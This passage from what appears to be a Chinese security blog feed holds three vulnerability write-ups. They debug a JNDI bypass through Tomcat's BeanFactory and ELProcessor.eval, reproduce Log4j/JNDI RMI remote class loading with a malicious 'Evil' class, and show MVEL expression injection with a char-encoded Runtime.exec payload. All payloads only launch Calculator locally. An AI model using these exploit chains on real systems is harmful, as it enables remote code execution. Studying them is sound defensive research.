                > 

<p>走到了我们实例化的地方，var3此时还是ResourceRef对象</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184424645.png"
                      class="" title="image-20250314184424645"
                > 

<p>这里获取factoryClassName，然后进行操作</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184537599.png"
                      class="" title="image-20250314184537599"
                > 

<p>漏洞触发点，这里构造成了<strong>org.apache.naming.factory.BeanFactory.getObjectInstance</strong> 就是我们上面写的地方</p>
<h3 id="org-apache-naming-factory-BeanFactory-1"><a href="#org-apache-naming-factory-BeanFactory-1" class="headerlink" title="org.apache.naming.factory.BeanFactory"></a>org.apache.naming.factory.BeanFactory</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314180259634.png"
                      class="" title="image-20250314180259634"
                > 

<p>这里获取了我们要利用的类的类名</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314180337115.png"
                      class="" title="image-20250314180337115"
                > 

<p>然后将他加载</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314180520260.png"
                      class="" title="image-20250314180520260"
                > 

<p>将它实例化存储在bean里面</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314191103326.png"
                      class="" title="image-20250314191103326"
                > 

<p>从forceString里面提取字符串a&#x3D;eval，然后提取为了param&#x3D;a，setterName&#x3D;eval</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314180633736.png"
                      class="" title="image-20250314180633736"
                > 

<p>跟进他这里的getMethod，因为此时我们的类在变量beanClass里，eval也是提取出来在setterName，没有拼接或者组合成<strong>javax.el.ELProcessor.eval()</strong> ,这里就是获取方法的地方，就像我们之前的<strong>类.getMethod(方法名,参数类型)</strong>  </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314181503362.png"
                      class="" title="image-20250314181503362"
                > 

<p>进行一个循环，要求右边那一列不为scope、auth、singletoken、forceString</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314181638180.png"
                      class="" title="image-20250314181638180"
                > 

<p>value就是获取的参数</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314181734119.png"
                      class="" title="image-20250314181734119"
                > 

<p>获取参数成功。</p>
<p>这里就很眼熟了，method为方法，bean为对象，valueArray就是参数，利用反射去造成命令执行。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314175123674.png"
                      class="" title="image-20250314175123674"
                > 

<p>计算器弹出成功。最后达成了类似<strong>eval.invoke(javax.el.ELProcessor,Runtime.getRuntime().exec(“open -a Calculator”))</strong></p>
]]></content>
      <categories>
        <category>漏洞原理分析</category>
      </categories>
      <tags>
        <tag>JNDI</tag>
      </tags>
  </entry>
  <entry>
    <title>Log4j漏洞分析</title>
    <url>/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul>
<li>rmi服务端</li>
<li>rmi客户端</li>
<li>恶意类的实现</li>
<li>idea+jdk1.8.0_441</li>
</ul>
<h2 id="pom-xml导入依赖"><a href="#pom-xml导入依赖" class="headerlink" title="pom.xml导入依赖"></a>pom.xml导入依赖</h2><p>正常可以使用maven</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.9.0&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></div>
<p>但是我使用的阿里云的maven配置，所以一直远程拉取不了，这里介绍本地配置依赖的方法<br>访问<a class="link"   href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.9.0" >https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.9.0<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311110830202.png"
                      class="" title="image-20250311110830202"
                >

<p>创建一个lib目录将依赖放进去</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311110902143.png"
                      class="" title="image-20250311110902143"
                > 

<p>然后pom.xml里面配置</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.9.0&lt;/version&gt;</span><br><span class="line">            &lt;systemPath&gt;$&#123;project.basedir&#125;/lib/log4j-core-2.9.0.jar&lt;/systemPath&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>

<h2 id="服务端代码实现"><a href="#服务端代码实现" class="headerlink" title="服务端代码实现"></a>服务端代码实现</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line"></span><br><span class="line">public class log4j_server &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(12345);</span><br><span class="line">        //创建一个注册表且端口为12345</span><br><span class="line">        Reference reference = new Reference(&quot;Evil&quot;, &quot;Evil&quot;,</span><br><span class="line">                &quot;http://127.0.0.1:8080/&quot;);</span><br><span class="line">        //创建Reference对象，类名为Evil，工厂类名为Evil</span><br><span class="line">        ReferenceWrapper wrapper = new ReferenceWrapper(reference);</span><br><span class="line">        //使用ReferenceWrapper包装Reference对象</span><br><span class="line">        registry.bind(&quot;remote&quot;, wrapper);</span><br><span class="line">        //将包装好的对象绑定到注册表中并设置名称为remote</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111035431.png"
                      class="" title="image-20250311111035431"
                >

<h2 id="客户端代码实现"><a href="#客户端代码实现" class="headerlink" title="客户端代码实现"></a>客户端代码实现</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mport javax.naming.InitialContext;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line">public class Log4j_client &#123;</span><br><span class="line">    public static void main(String[] args) throws NamingException &#123;</span><br><span class="line">        //System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);</span><br><span class="line">        // 这里先注释掉，这里是高版本jdk的防范机制，对url默认不信任，然后无法复现成功</span><br><span class="line">        InitialContext initialContext=new InitialContext();</span><br><span class="line">        // 创建一个JNDI InitialContext实例，用于访问JNDI服务</span><br><span class="line">        initialContext.lookup(&quot;rmi://127.0.0.1:12345/remote&quot;);</span><br><span class="line">        // 尝试连接远程主机</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111158954.png"
                      class="" title="image-20250311111158954"
                > 

<h2 id="恶意类Evil"><a href="#恶意类Evil" class="headerlink" title="恶意类Evil"></a>恶意类Evil</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.Name;</span><br><span class="line">import javax.naming.spi.ObjectFactory;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">public class Evil implements ObjectFactory &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111254962.png"
                      class="" title="image-20250311111254962"
                > 

<h2 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h2><p>启动服务端和客户端</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111345871.png"
                      class="" title="image-20250311111345871"
                > 

<p><em>报错The object factory is untrusted. Set the system property ‘com.sun.jndi.rmi.object.trustURLCodebase’ to ‘true’</em> </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111457239.png"
                      class="" title="image-20250311111457239"
                > 

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250314171332324.png"
                      class="" title="image-20250314171332324"
                > 

<p>我们需要进入getObjectInstance，所以我们需要进入else，就是if的条件一个都不能满足，低版本的jdk里面没有这个限制可以不用设置。高版本有这个设置。所以测试的时候不采用绕过手段我们就需要全局设置trustURLCodebase参数设置为true<strong>这里我们初步学习不采用绕过方式，所以需要设置trustURLCodebase为true</strong> </p>
<p>所以可以先在代码层面配置一下</p>
<p>把客户端注释删掉</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111521783.png"
                      class="" title="image-20250311111521783"
                > 

<p> 再次运行</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111556400.png"
                      class="" title="image-20250311111556400"
                >

<p>实现命令执行</p>
<h1 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h1><p>端点打在客户端的<strong>initialContext.lookup(“rmi:&#x2F;&#x2F;127.0.0.1:12345&#x2F;remote”);</strong> </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311112142514.png"
                      class="" title="image-20250311112142514"
                > 

<p>跟进initialContext.lookup</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311112322450.png"
                      class="" title="image-20250311112322450"
                >

<p>这里通过提取协议，提取出来了rmi，然后判断协议是否为空，如果不为空说明是我们的url是一个ip地址  </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311112621799.png"
                      class="" title="image-20250311112621799"
                >

<p>回到上面的lookup跟进</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113252823.png"
                      class="" title="image-20250311113252823"
                >

<p>ResolveResult var2 &#x3D; this.getRootURLContext(var1, this.myEnv);</p>
<p>这个函数将我们的url给提取成了ip，port，以及注册表的绑定的名字remote</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113439043.png"
                      class="" title="image-20250311113439043"
                >

<p>var3也是，知识获取了对象并且设置对象的类型为context</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113517988.png"
                      class="" title="image-20250311113517988"
                >

<p>跟进这里的lookup，漏洞触发的地方</p>
<p>先看var2.getRemainingName() 会返回的是什么参数</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113727742.png"
                      class="" title="image-20250311113727742"
                >

<p>就只是返回remote，我们注册表的名字</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113816366.png"
                      class="" title="image-20250311113816366"
                >

<p>判断我们传入的注册表的名字是否为空，我们的是remote不为空，所以往下走</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113905487.png"
                      class="" title="image-20250311113905487"
                > 

<p>这里传入的也是remote</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113938872.png"
                      class="" title="image-20250311113938872"
                > 

<p>这里我们可以看到有个readobject了，可以看看var4是怎么获取的也是一种思路<strong>我们这里是采用加载远程恶意类对象</strong> </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114259827.png"
                      class="" title="image-20250311114259827"
                > 

<p>可以看到我们的var20即将被返回的值是我们的远程恶意类对象</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114349568.png"
                      class="" title="image-20250311114349568"
                > 

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114558379.png"
                      class="" title="image-20250311114558379"
                > 

<p>然后将我们的恶意类对象给实例化</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114639838.png"
                      class="" title="image-20250311114639838"
                > 

<p>跟进函数</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114944263.png"
                      class="" title="image-20250311114944263"
                > 发现builder为null，所以不会进入这个if

<p>将恶意类名称赋值给了ref</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311115057408.png"
                      class="" title="image-20250311115057408"
                > 

<p>获取对象的实例</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311120004969.png"
                      class="" title="image-20250311120004969"
                >

<p>获取实例的时候会调用我们写的无参构造方法，所以就执行了我们的恶意代码。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311120021055.png"
                      class="" title="image-20250311120021055"
                > 

<h2 id="恶意类的无参构造初始化"><a href="#恶意类的无参构造初始化" class="headerlink" title="恶意类的无参构造初始化"></a>恶意类的无参构造初始化</h2><p>根据上面链子发现factory.getObjectInstance函数会调用我们的类的无参实例化方法</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.Name;</span><br><span class="line">import javax.naming.spi.ObjectFactory;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">public class Evil implements ObjectFactory &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h2 id="类的静态方法"><a href="#类的静态方法" class="headerlink" title="类的静态方法"></a>类的静态方法</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Evil_static &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311125258505.png"
                      class="" title="image-20250311125258505"
                >

<p>成功造成命令执行</p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>这里的漏洞触发点有一些不同</p>
<p>javax&#x2F;naming&#x2F;spi&#x2F;NamingManager.java</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130215787.png"
                      class="" title="image-20250311130215787"
                > 

<p>这里有个if判断，codebase为null所以不会进去</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130605217.png"
                      class="" title="image-20250311130605217"
                > 

<p>最后会走到对我们恶意类的实例化</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130335797.png"
                      class="" title="image-20250311130335797"
                >

<p>然后实例化调用了静态方法造成RCE</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130639541.png"
                      class="" title="image-20250311130639541"
                > 

]]></content>
      <categories>
        <category>漏洞原理分析</category>
      </categories>
      <tags>
        <tag>JNDI</tag>
      </tags>
  </entry>
  <entry>
    <title>MVEL表达式漏洞利用方式</title>
    <url>/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<p>MVEL 是一个表达式语言，一般用于解析和执行基于 Java 基础语言和语法风格的表达式。在动态规则执行和条件匹配方面，MVEL 是一个出色的选择，因为它允许你在运行时定义和修改规则，并立即处理这些规则。</p>
<p><em>由上面这句话可以看出他可以执行基本的Java语句，那就有可能造成命令执行</em> </p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li>maven</li>
</ul>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.mvel&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;mvel2&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;2.4.4.Final&lt;/version&gt; &lt;!-- 你可以根据需要选择其他版本 --&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>

<h2 id="MVEL-eval-expression"><a href="#MVEL-eval-expression" class="headerlink" title="MVEL.eval(expression)"></a>MVEL.eval(expression)</h2><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313221728551.png"
                      class="" title="image-20250313221728551"
                > 

<p>成功弹出了计算器，说明我们的java代码被正确的执行了。<br>此时可以得出如果我们在白盒审计中发现MVEL直接调用eval函数，那我们就可以插入恶意的java代码去造成命令执行。</p>
<h2 id="ShellSession"><a href="#ShellSession" class="headerlink" title="ShellSession"></a>ShellSession</h2><p>这是个MVEL表达式里面的一个类，这个类也可以造成命令执行，但是需要对我们传入的字符串进行一定的处理。<br>且他造成命令执行的入口并不是eval函数，而是他有参构造函数的时候一步一步调用到eval。如果实例化的行为可控，那就可以造成漏洞。</p>
<p>恶意代码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.mvel2.sh.ShellSession;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String expression = &quot;push Runtime.getRuntime().exec(String.valueOf((char)111)+String.valueOf((char)112)+String.valueOf((char)101)+String.valueOf((char)110)+String.valueOf((char)32)+String.valueOf((char)45)+String.valueOf((char)97)+String.valueOf((char)32)+String.valueOf((char)67)+String.valueOf((char)97)+String.valueOf((char)108)+String.valueOf((char)99)+String.valueOf((char)117)+String.valueOf((char)108)+String.valueOf((char)97)+String.valueOf((char)116)+String.valueOf((char)111)+String.valueOf((char)114));&quot;;//这个是弹出计算器的命令</span><br><span class="line">        ShellSession shellSession = new ShellSession(expression);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="ShellSession-String-init"><a href="#ShellSession-String-init" class="headerlink" title="ShellSession(String init)"></a>ShellSession(String init)</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313222212134.png"
                      class="" title="image-20250313222212134"
                > 

<p>他的有参构造函数调用了exec</p>
<h4 id="exec-String-command"><a href="#exec-String-command" class="headerlink" title="exec(String command)"></a>exec(String command)</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313222254259.png"
                      class="" title="image-20250313222254259"
                > 

<p>这里将传入的字符串根据换行符分开，每次循环的时候取出一个，然后我们继续跟进_exec</p>
<h4 id="exec"><a href="#exec" class="headerlink" title="_exec()"></a>_exec()</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313222418477.png"
                      class="" title="image-20250313222418477"
                > 

<p>这里会对我们刚才提取的inBuffer参数进行根据空格来分割，例如open -a Calculator 会分成 [‘open’,’-a’,’Calculator’]放入数组intokens里面<br>passParameters &#x3D; new String[inTokens.length - 1]提取了我们分隔出来的数组的最后一个参数，如例子那就是Calculator</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313222659853.png"
                      class="" title="image-20250313222659853"
                > 

<p>提取inTokens数组里面第一个作为类，然后去执行execute方法。</p>
<h4 id="pushContext类的利用"><a href="#pushContext类的利用" class="headerlink" title="pushContext类的利用"></a>pushContext类的利用</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313222824212.png"
                      class="" title="image-20250313222824212"
                > 

<p>这里面是存在MVEL.eval()的函数调用的，如果args参数可控，我们即可造成漏洞。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313222924300.png"
                      class="" title="image-20250313222924300"
                > 

<p>所以我们要满足三个条件</p>
<ul>
<li>第一个被空格分隔提取的参数要为对应类的key，假如push对应pushContext</li>
<li>inTokens数组的长度要大于1，才会给我们的passParameters参数赋值</li>
<li>this.commands.get(inTokens[0]))看看是否可以让他对应的类为pushContext</li>
</ul>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223338551.png"
                      class="" title="image-20250313223338551"
                > 

<p>跟进去</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223353224.png"
                      class="" title="image-20250313223353224"
                > 

<p>走到有参构造这里，init字符串就是我们的恶意payload</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223434006.png"
                      class="" title="image-20250313223434006"
                > 

<p>这里根据我们的\n符号去分隔我们的字符串，但是我们没有换行，有<strong>空格</strong> ，所以就没有被分隔</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223547230.png"
                      class="" title="image-20250313223547230"
                > 

<p>继续跟进发现我们的字符串被空格分隔了，分成了push和后面的那部份</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223806525.png"
                      class="" title="image-20250313223806525"
                > 

<p>此时如果inTokens里面的第一个参数是push，则可以指向我们的漏洞利用类</p>
<p>因为inTokens&gt;1所以进入给参数赋值</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223658474.png"
                      class="" title="image-20250313223658474"
                > 

<p>走到这里漏洞利用的地方</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223940229.png"
                      class="" title="image-20250313223940229"
                > 

<p>就可以理解为pushContext.execute(this,我们的恶意java代码)</p>
<img  
                     lazyload
